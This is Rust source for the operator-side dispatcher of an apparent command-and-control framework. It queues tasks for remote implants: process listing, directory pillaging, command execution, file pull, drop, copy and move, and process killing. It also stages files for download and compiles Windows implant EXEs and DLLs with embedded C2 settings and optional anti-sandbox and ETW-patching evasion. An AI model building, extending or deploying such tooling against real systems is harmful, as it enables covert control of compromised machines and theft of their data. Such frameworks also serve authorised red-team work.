use std::{
    io,
    path::{Path, PathBuf},
    sync::Arc,
};

use crate::{
    FILE_STORE_PATH,
    app_state::{AppState, DownloadEndpointData},
    logging::log_error_async,
    profiles::get_profile,
};
use axum::extract::State;
use chrono::{SecondsFormat, Utc};
use serde_json::Value;
use shared::tasks::{
    AdminCommand, BuildAllBins, Command, FileDropMetadata, FileUploadStagingFromClient,
    NewAgentStaging, StageType, WyrmResult,
};
use shared_c2_client::AgentC2MemoryNotifications;
use tokio::fs;

/// Main dispatcher for admin commands issued on the server, which may, or may not, include an
/// implant UID.
pub async fn admin_dispatch(
    uid: Option<String>,
    command: AdminCommand,
    state: State<Arc<AppState>>,
) -> Vec<u8> {
    // Note, due to the use of generics with the function `task_agent`, if you are passing `None`
    // into the function, you will have to turbofish a type which does implement ToString - so,
    // to keep it simple, just turbofish String - it will be discarded as the `None` path will be
    // taken
    let result: Option<Value> = match command {
        AdminCommand::Sleep(time) => task_agent_sleep(time, uid.unwrap(), state).await,
        AdminCommand::ListAgents => list_agents(state).await,
        AdminCommand::ListProcesses => {
            task_agent::<String>(Command::Ps, None, uid.unwrap(), state).await
        }
        AdminCommand::GetUsername => todo!(),
        AdminCommand::ListUsersDirs => {
            task_agent::<String>(Command::Pillage, None, uid.unwrap(), state).await
        }
        AdminCommand::PullNotifications => pull_notifications_for_agent(uid.unwrap(), state).await,
        AdminCommand::Pwd => task_agent::<String>(Command::Pwd, None, uid.unwrap(), state).await,
        AdminCommand::Cd(path_buf) => {
            task_agent(Command::Cd, Some(path_buf), uid.unwrap(), state).await
        }
        AdminCommand::KillAgent => {
            task_agent::<String>(Command::KillAgent, None, uid.unwrap(), state).await
        }
        AdminCommand::Ls => task_agent::<String>(Command::Ls, None, uid.unwrap(), state).await,
        AdminCommand::ShowServerTime => show_server_time(),
        AdminCommand::Login => Some(serde_json::to_value("success").unwrap()),
        AdminCommand::ListStagedResources => list_staged_resources(state).await,
        AdminCommand::Run(args) => task_agent(Command::Run, Some(args), uid.unwrap(), state).await,
        AdminCommand::DeleteStagedResource(download_endpoint) => {
            delete_staged_resources(state, download_endpoint).await
        }
        AdminCommand::RemoveAgentFromList => remove_agent_from_list(state, uid.unwrap()).await,
        AdminCommand::Undefined => panic!("This should never happen."),
        AdminCommand::StageFileOnC2(metadata) => {
            stage_file_upload_from_users_disk(metadata, state).await
        }
        AdminCommand::KillProcessById(pid) => {
            task_agent::<String>(Command::KillProcess, Some(pid), uid.unwrap(), state).await
        }
        AdminCommand::Drop(data) => drop_file_handler(uid, data, state).await,
        AdminCommand::Copy(inner) => {
            // Serialise the (String, String) to just a String so we can use it with the
            // generic task_agent.
            let inner_serialised = match serde_json::to_string(&inner) {
                Ok(s) => Some(s),
                Err(e) => {
                    log_error_async(&e.to_string()).await;
                    None
                }
            };

            if inner_serialised.is_some() {
                task_agent::<String>(Command::Copy, inner_serialised, uid.unwrap(), state).await
            } else {
                None
            }
        }
        AdminCommand::Move(inner) => {
            // Serialise the (String, String) to just a String so we can use it with the
            // generic task_agent.
            let inner_serialised = match serde_json::to_string(&inner) {
                Ok(s) => Some(s),
                Err(e) => {
                    log_error_async(&e.to_string()).await;
                    None
                }
            };

            if inner_serialised.is_some() {
                task_agent::<String>(Command::Move, inner_serialised, uid.unwrap(), state).await
            } else {
                // Error logged in above failure path
                None
            }
        }
        AdminCommand::Pull(file_path) => {
            task_agent(Command::Pull, Some(file_path), uid.unwrap(), state).await
        }
        AdminCommand::BuildAllBins(bab) => build_all_bins(bab, state).await,
    };

    serde_json::to_vec(&result).unwrap()
}

/// Builds all binaries from a given profile
///
/// On success, this function returns None, otherwise an Error is encoded within a `Value` as a `WyrmResult`
async fn build_all_bins(bab: BuildAllBins, state: State<Arc<AppState>>) -> Option<Value> {
    let save_path = PathBuf::from(bab.1);
    let profile_name = bab.0;

    //
    // Read the profile from disk
    //

    let profile = match get_profile(&profile_name).await {
        Ok(p) => p,
        Err(e) => {
            let msg = format!("Error reading profile: {profile_name}. {e:?}");
            log_error_async(&msg).await;

            let msg_s = WyrmResult::Err::<String>(msg);
            let ser = serde_json::to_value(msg_s).unwrap();
            return Some(ser);
        }
    };

    let listener_profile_name = &bab.2.unwrap_or("default".into());
    let implant_profile_name = &bab.3.unwrap_or("default".into());

    //
    // Transform the profile into a valid `NewAgentStaging`
    //
    let mut data = match profile.as_staged_agent(
        listener_profile_name,
        implant_profile_name,
        StageType::All,
    ) {
        WyrmResult::Ok(d) => d,
        WyrmResult::Err(e) => {
            let msg = format!("Error constructing a NewAgentStaging: {profile_name}. {e:?}");
            log_error_async(&msg).await;

            let ser = serde_json::to_value(WyrmResult::Err::<String>(msg)).unwrap();
            return Some(ser);
        }
    };

    //
    // For every build type, build it - we manually specify the loop size here so as more
    // build options are added, the loop will need to be increased to accommodate.
    //
    for i in 0..2 {
        let stage_type = match i {
            0 => StageType::Exe,
            1 => StageType::Dll,
            _ => unreachable!(),
        };

        // Actually try build with cargo
        let cmd_build_output = build_agent(&data, stage_type).await;

        if let Err(e) = cmd_build_output {
            let msg = &format!("Failed to build agent. {e}");
            log_error_async(msg).await;
            return stage_new_agent_error_printer(msg, &data.staging_endpoint, state).await;
        }

        let output = cmd_build_output.unwrap();
        if !output.status.success() {
            let msg = &format!(
                "Failed to build agent. {:#?}",
                String::from_utf8_lossy(&output.stderr),
            );
            log_error_async(msg).await;

            return stage_new_agent_error_printer(msg, &data.staging_endpoint, state).await;
        }

        //
        // Move the built implant to where the operator requested it to be built in
        //
        let dir_name = {
            match data.build_debug {
                true => "debug",
                false => "release",
            }
        };

        let src_dir = if cfg!(windows) {
            PathBuf::from(format!("../target/{dir_name}"))
        } else {
            PathBuf::from(format!("../target/x86_64-pc-windows-msvc/{dir_name}"))
        };

        let out_dir = Path::new(&save_path);
        let src = match stage_type {
            StageType::Dll => src_dir.join("implant.dll"),
            StageType::Exe => src_dir.join("implant.exe"),
            StageType::All => unreachable!(),
        };

        let mut dest = out_dir.join(&data.pe_name);

        if !(match stage_type {
            StageType::Dll => dest.add_extension("dll"),
            StageType::Exe => dest.add_extension("exe"),
            StageType::All => unreachable!(),
        }) {
            let msg = format!("Failed to add extension to local file. {dest:?}");
            log_error_async(&msg).await;

            return Some(serde_json::to_value(WyrmResult::Err::<String>(msg)).unwrap());
        };

        // Error check..
        if let Err(e) = tokio::fs::rename(&src, &dest).await {
            return stage_new_agent_error_printer(
                &format!(
                    "Failed to rename built agent, looking for: {}, to rename to: {}. {e}",
                    src.display(),
                    dest.display()
                ),
                &data.staging_endpoint,
                state,
            )
            .await;
        };

        //
        // Update state to include a new endpoint for the listeners
        //
        if let Err(e) = is_download_staging_url_error(&data, &state).await {
            return stage_new_agent_error_printer(
                &format!("The download URL matches an existing one, or a URL which is used for agent check-in, \
                this is not permitted. Kind: {e:?}"),
                &data.staging_endpoint,
                state,
            )
            .await;
        }
    }

    None
}

async fn list_agents(state: State<Arc<AppState>>) -> Option<Value> {
    let agents = state.connected_agents.list_agents();

    let mut new_agents: Vec<AgentC2MemoryNotifications> = Vec::new();

    let mut maybe_entry = agents.first_entry_async().await;
    while let Some(row) = maybe_entry {
        let agent = row.read().await;

        // time formatting
        let last_check_in = agent
            .last_checkin_time
            .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);

        // The string we will send back representing the individual agent
        let formatted = format!(
            "\t{}\t\t{}\t{}\t{}",
            agent.uid, last_check_in, agent.first_run_data.b, agent.first_run_data.c,
        );

        let new_messages = pull_notifications_for_agent(agent.uid.clone(), state.clone()).await;

        new_agents.push((formatted, agent.is_stale, new_messages));

        drop(agent);
        maybe_entry = row.next_async().await;
    }

    Some(serde_json::to_value(&new_agents).expect("could not serialise"))
}

/// Inserts a new task for the agent where the format of the task metadata is already valid. This function is
/// just a wrapper for a database interaction.
///
/// # Returns
/// None - the task is queued and the resulting data can be made available with the 'n' function on the cli.
async fn task_agent<T: Into<String>>(
    command: Command,
    metadata: Option<T>,
    uid: String,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let metadata = metadata.map(|t| t.into());

    state
        .db_pool
        .add_task_for_agent_by_id(&uid, command, metadata)
        .await
        .unwrap();

    None
}

/// Inserts a new task in the db instructing the agent to alter its sleep time. This will also be reflected in the
/// agent's metadata on the agent db entry for persistence.
async fn task_agent_sleep(time: i64, uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    let time_as_str = time.to_string();
    state
        .db_pool
        .update_agent_sleep_time(&uid, time)
        .await
        .unwrap();

    state
        .db_pool
        .add_task_for_agent_by_id(&uid, Command::Sleep, Some(time_as_str))
        .await
        .unwrap();

    // We dont have any metadata to send back to the client, so an empty vec is sufficient
    None
}

/// Queries the database for the pending notifications for a given agent, and then marks them as pulled.
async fn pull_notifications_for_agent(uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    // Used to store the completed ID's we took from the DB to mark them as
    // pulled.
    let mut ids = Vec::new();

    let agent_notifications = match state.db_pool.pull_notifications_for_agent(&uid).await {
        Ok(inner) => {
            let inner = inner.map(|t| {
                t.iter().for_each(|n| ids.push(n.completed_id));
                serde_json::to_value(&t).unwrap()
            });
            if inner.is_none() {
                return inner;
            } else {
                inner
            }
        }
        Err(e) => {
            panic!("Could not pull notifications for agent {uid}. {e}");
        }
    };

    // At this point the notifications have been pulled, but they are still set in teh database.
    // So we need to set them as pulled so we don't duplicate tasking.

    // assert_eq!(ids.is_empty(), false);

    state
        .db_pool
        .mark_agent_notification_completed(&ids)
        .await
        .unwrap();

    agent_notifications
}

/// Returns the time of the server in UTC
fn show_server_time() -> Option<Value> {
    let time_now = Utc::now();
    let time_now_snipped = time_now.to_rfc3339_opts(SecondsFormat::Secs, true);

    match serde_json::to_value(&time_now_snipped) {
        Ok(time) => Some(time),
        Err(e) => {
            let s = format!("Failed to serialise server time. {e}");
            Some(serde_json::to_value(&s).unwrap())
        }
    }
}

/// Stages a file uploaded to the C2 by an admin which will be made available for public download
/// at a specified API endpoint.
async fn stage_file_upload_from_users_disk(
    data: FileUploadStagingFromClient,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let out_dir = Path::new(FILE_STORE_PATH);
    let dest = out_dir.join(&data.download_name);

    // Write to disk
    if let Err(e) = fs::write(&dest, &data.file_data).await {
        let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
            "Failed to write file on C2: {e:?}",
        )))
        .unwrap();

        return Some(serialised);
    }

    //
    // We can reuse the db function to stage a new agent, except we are serving our download instead.
    // To make this work we just need to fudge a few fields which aren't needed, but it allows for
    // database compliancy without addition additional logic, which in turn will also affect that process.
    // todo this should probably be a `NewAgentStaging::from_x`
    //
    let agent_stage_template = NewAgentStaging {
        implant_name: "-".into(),
        default_sleep_time: 0,
        c2_address: "-".into(),
        c2_endpoints: vec!["-".into()],
        staging_endpoint: data.api_endpoint.clone(),
        pe_name: data.download_name.clone(),
        port: 1,
        agent_security_token: "-".into(),
        antisandbox_trig: false,
        antisandbox_ram: false,
        stage_type: shared::tasks::StageType::Exe,
        build_debug: false,
        useragent: "".into(),
        patch_etw: false,
        jitter: None,
    };

    //
    // Try insert into the database, following that, deconflict the download URI and add it into the in-memory
    // list.
    //
    if let Err(e) = state.db_pool.add_staged_agent(&agent_stage_template).await {
        log_error_async(&format!("Failed to insert row in db: {e:?}")).await;
        let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
            "Failed to insert row in db for new staged agent: {e:?}",
        )))
        .unwrap();

        return Some(serialised);
    };

    // If we receive an error whilst trying to upload the staged data, return an error.
    if let Err(e) = add_api_endpoint_for_staged_resource(&agent_stage_template, state.clone()).await
    {
        return stage_new_agent_error_printer(
            &format!(
                "The download URL matches an existing one, or a URL which is used for agent \
                check-in, this is not permitted. Kind: {e:?}"
            ),
            &data.download_name,
            state,
        )
        .await;
    };

    let serialised = match serde_json::to_value(WyrmResult::Ok(format!(
        "File successfully uploaded, and is being served at /{}. File name: {}",
        data.api_endpoint, data.download_name,
    ))) {
        Ok(s) => s,
        Err(e) => {
            return stage_new_agent_error_printer(
                &format!("Failed to serialise response. {e}"),
                &data.download_name,
                state,
            )
            .await;
        }
    };

    Some(serialised)
}

/// Validates the extension of the build target matches that expected by the operator
/// after building takes place.
fn validate_extension(name: &String, expected_type: StageType) -> String {
    let mut new_name = String::from(name);

    match expected_type {
        StageType::Dll => {
            if !new_name.ends_with(".dll") && (name.ends_with(".exe") || name.ends_with(".svc")) {
                let _ = new_name.replace(".exe", "");
                let _ = new_name.replace(".svc", "");
                new_name.push_str(".dll");
            } else {
                new_name.push_str(".dll");
            }
        }
        StageType::Exe => {
            if !new_name.ends_with(".exe") && (name.ends_with(".dll") || name.ends_with(".svc")) {
                let _ = new_name.replace(".dll", "");
                let _ = new_name.replace(".svc", "");
                new_name.push_str(".exe");
            } else {
                new_name.push_str(".exe");
            }
        }
        StageType::All => unreachable!(),
    }

    new_name
}

/// Builds the specified agent as a PE.
///
/// # Important
/// The PE name passed into this function should NOT include its extension.
async fn build_agent(
    data: &NewAgentStaging,
    stage_type: StageType,
) -> Result<std::process::Output, std::io::Error> {
    //
    // Try insert the data into the db. We have some constraints on the db so that it cannot stage
    // at duplicate endpoints, or with duplicate names, etc.
    //

    if stage_type == StageType::All {
        return Err(io::Error::other("StageType::All not supported"));
    }

    let pe_name = validate_extension(&data.pe_name, stage_type);

    // Check for any feature flags
    let features: Vec<String> = if data.antisandbox_ram || data.antisandbox_trig {
        let mut builder = vec!["--features".to_string()];
        let mut string_builder = String::new();

        if data.antisandbox_ram {
            string_builder.push_str("sandbox_mem,");
        }
        if data.antisandbox_trig {
            string_builder.push_str("sandbox_trig,");
        }
        if data.patch_etw {
            string_builder.push_str("patch_etw,");
        }

        builder.push(string_builder);

        builder
    } else {
        vec![]
    };

    let build_as_flags = match stage_type {
        shared::tasks::StageType::Dll => vec!["--lib"],
        shared::tasks::StageType::Exe => vec!["--bin", "implant"],
        StageType::All => vec![],
    };

    //
    // Now we want to actually build the agent itself. We will do this on the C2, building the
    // agent via the local command shell.
    //
    // As operators shouldn't be doing this frequently, I can't see much harm in terms of CPU and
    // memory, but this may need to be profiled.
    //
    // We are also relying on the C2 being run from the correct point as pathing here is going to be
    // relative to allow flexibility on server installations. The C2 must run from the c2 crate directly
    // for the pathing to work.
    //

    let toolchain = "nightly";
    let target = if cfg!(windows) {
        None
    } else {
        Some("x86_64-pc-windows-msvc")
    };

    let mut cmd = tokio::process::Command::new("cargo");

    let c2_endpoints = data
        .c2_endpoints
        .iter()
        .map(|e| e.to_string() + ",")
        .collect::<String>();

    let jitter = data.jitter.unwrap_or_default();

    cmd.env("RUSTUP_TOOLCHAIN", toolchain)
        .current_dir("../implant")
        .env("AGENT_NAME", &data.implant_name)
        .env("PE_NAME", pe_name)
        .env("DEF_SLEEP_TIME", data.default_sleep_time.to_string())
        .env("C2_HOST", &data.c2_address)
        .env("C2_URIS", c2_endpoints)
        .env("C2_PORT", data.port.to_string())
        .env("JITTER", jitter.to_string())
        .env("USERAGENT", &data.useragent)
        .env("STAGING_URI", &data.staging_endpoint)
        .env("SECURITY_TOKEN", &data.agent_security_token);

    if !cfg!(windows) {
        cmd.arg("xwin");
    }

    cmd.arg("build");

    if let Some(t) = target {
        cmd.args(["--target", t]);
    }

    if !data.build_debug {
        cmd.arg("--release");
    }

    cmd.args(build_as_flags).args(features);

    cmd.output().await
}

/// Prints an error to the C2 console and returns a formatted error.
///
/// **IMPORTANT**: This function will also delete the staged_agent row from the database by it's `implant_name`.
async fn stage_new_agent_error_printer(
    message: &str,
    uri: &str,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    log_error_async(message).await;
    let _ = state.db_pool.delete_staged_resource_by_uri(uri).await;

    let serialised = serde_json::to_value(WyrmResult::Err::<String>(message.to_string())).unwrap();

    Some(serialised)
}

/// Lists staged resources on the C2, such as staged agents
async fn list_staged_resources(state: State<Arc<AppState>>) -> Option<Value> {
    let results = match state.db_pool.get_staged_agent_data().await {
        Ok(r) => WyrmResult::Ok(r),
        Err(e) => {
            log_error_async(&format!("Failed to list resources: {e:?}")).await;
            WyrmResult::Err(e.to_string())
        }
    };

    let ser = serde_json::to_value(results).unwrap();

    Some(ser)
}

/// Deletes a staged resource from the database by its internal stage name
async fn delete_staged_resources(
    state: State<Arc<AppState>>,
    download_endpoint: String,
) -> Option<Value> {
    // Delete from db
    let results = state
        .db_pool
        .delete_staged_resource_by_uri(&download_endpoint)
        .await
        .unwrap();

    {
        // remove the download stage from the in memory list
        let mut lock = state.endpoints.write().await;
        lock.download_endpoints.remove(&download_endpoint);
    }

    // Delete from disk
    let mut file_to_delete = PathBuf::from(FILE_STORE_PATH);
    file_to_delete.push(results);
    tokio::fs::remove_file(&file_to_delete).await.unwrap();

    let ser = serde_json::to_value(()).unwrap();

    Some(ser)
}

async fn remove_agent_from_list(state: State<Arc<AppState>>, agent_name: String) -> Option<Value> {
    state.connected_agents.remove_agent(&agent_name).await;

    None
}

/// Error state which could occur when trying to add a stage or file to the C2
#[derive(Debug)]
enum StageError {
    EndpointExistsDownload,
    EndpointExistsCheckIn,
}

/// Adds an API endpoint for public use on the C2 which relates to a custom file / a new agent uploaded
/// by the admin on the client.
///
/// The function handles errors and deconflictions, ensuring that we do not cause any duplication. If no errors are
/// encountered, it will insert the relevant data into the in-memory structures.
///
/// This function does **not** handle database insertions, and assumes they have already been done / will be done
/// hereafter.
///
/// # Returns
/// - `Ok`: If successful, unit Ok is returned
/// - `Err`: If there is an error adding a URI, the error is returned as a [`StageError`]
async fn add_api_endpoint_for_staged_resource(
    data: &NewAgentStaging,
    state: State<Arc<AppState>>,
) -> Result<(), StageError> {
    // Check we dont overlap incompatible URI's
    is_download_staging_url_error(data, &state).await?;

    let mut server_endpoints = state.endpoints.write().await;

    server_endpoints.download_endpoints.insert(
        data.staging_endpoint.clone(),
        DownloadEndpointData::new(&data.pe_name, &data.implant_name, None),
    );

    Ok(())
}

/// Checks whether a staged URI exists in a way which is incompatible. For example, you cannot have two
/// download URI's that overlap, and you cannot have a checkin URI overlapping with a download URI.
async fn is_download_staging_url_error(
    data: &NewAgentStaging,
    state: &State<Arc<AppState>>,
) -> Result<(), StageError> {
    //
    // Check for conflicts with download and staging API's, that is what we look for in the first
    // three vars, `c2_conflicts_download`, `staging_conflicts_c2` & `staging_conflicts_self`
    //
    let server_endpoints = state.endpoints.read().await;
    for e in &data.c2_endpoints {
        if server_endpoints.download_endpoints.contains_key(e) == true {
            return Err(StageError::EndpointExistsDownload);
        }
    }

    // Check the existing C2 endpoints with the proposed staging endpoint (only in the case
    // where the operator is building manually as opposed to the profile). Building via the profile
    // currently results in a empty string "", which is why we do this check.
    if !data.staging_endpoint.is_empty()
        && server_endpoints
            .c2_endpoints
            .contains(&data.staging_endpoint)
    {
        return Err(StageError::EndpointExistsCheckIn);
    }

    if server_endpoints
        .download_endpoints
        .contains_key(&data.staging_endpoint)
    {
        return Err(StageError::EndpointExistsDownload);
    }

    Ok(())
}

/// Handler for instructing the agent to drop a file to disk.
async fn drop_file_handler(
    uid: Option<String>,
    mut data: FileDropMetadata,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    //
    // Check whether we actually have that file available on the server.
    // If we do not have the file, we want to return `None` as to not task the agent with downloading a file that doesn't
    // exist. An error message will appear in the server error log.
    //
    let mut found = false;
    {
        let lock = state.endpoints.read().await;

        for row in lock.download_endpoints.iter() {
            if row.1.internal_name.eq(&data.internal_name) {
                found = true;
                // The URI doesn't include the leading /, so we add it here
                data.download_uri = Some(format!("/{}", row.0));
                break;
            }
        }
    }

    if !found {
        log_error_async(&format!("Could not find staged file when instructing agent to drop a file to disk. Looking for file name: '{}' \
            but it does not exist in memory.", data.internal_name)).await;
        return None;
    }

    task_agent::<String>(Command::Drop, Some(data.into()), uid.unwrap(), state).await
}
